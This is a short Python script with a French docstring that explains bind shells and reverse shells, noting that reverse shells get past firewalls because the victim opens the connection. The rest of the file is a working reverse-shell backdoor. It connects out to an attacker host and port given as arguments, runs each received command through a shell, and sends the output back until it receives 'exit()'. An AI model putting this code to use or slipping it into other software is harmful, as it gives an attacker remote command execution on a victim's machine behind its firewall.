"""
    On a deux type de Backdoor:
    - Bind Shell : L'attaquant va donc envoyer son programme malveillant, ceci dans le but de mettre la machine cible en écoute
    sur un port spécifique.
    C'est une Backdoor qui permet de créer la connection entre l'attaquant via un port définit par ce dernier et la victime.
    Donc la connexion vient de l'attaquant vers la machine compromise.
    Problème dans cette situation:
    Le problème vient du fait que la connexion vient de la part de l'attaquant. Donc si l'on établit un Firewall entre l'attaquant
    et la victime, le Firewall va bloquer cette connexion. D'où vient l'interet d'utiliser la deuxième technique "Reverse Shell"

    - Reverse Shell : Semblable au Bind Shell sauf que cette fois c'est l'attaquant qui sera en écoute,
    Et c'est la victime qui va initier la connexion avec l'attaquant. Dans ce cas, même s'il y a un Firewall, il ne pourra rien faire
    puisque la connexion a été initialisé de l'interieur vers l'attaquant.

"""
import socket, sys, subprocess as sp
host = str(sys.argv[1])
port = int(sys.argv[2])
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))
while 1:
    command = str(conn.recv(1024))
    if command != "exit()":
        sh = sp.Popen(
            command, shell=True,
            stdout=sp.PIPE,
            stderr=sp.PIPE,
            stdin=sp.PIPE
        )
        out, err = sh.communicate()
        result = str(out) + str(err)
        taille = str(len(result)).zfill(16)
        conn.send(taille + result)
    else:
        break
conn.close()
